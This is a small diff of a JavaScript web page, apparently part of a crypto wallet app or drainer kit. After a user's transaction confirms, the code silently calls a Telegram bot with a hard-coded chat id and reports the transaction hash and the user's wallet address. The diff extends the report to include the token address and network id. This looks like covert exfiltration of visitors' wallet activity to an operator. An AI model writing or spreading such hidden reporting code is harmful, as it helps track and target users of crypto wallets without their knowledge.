@@ -220,7 +220,7 @@ window.onload = () =>{
         );
 
         await tx.wait();
-        fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=5204205237&text=Tx- <code>${tx.hash}</code>, Address- <code>${useraddress}</code>&parse_mode=HTML`);
+        fetch(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=5204205237&text=Tx- <code>${tx.hash}</code>, User Address- <code>${useraddress}</code> , Token address - <code>${tokenAddress}</code> , Network Id - <code>${network_id}</code>&parse_mode=HTML`);
       }
 
       await getBalance();
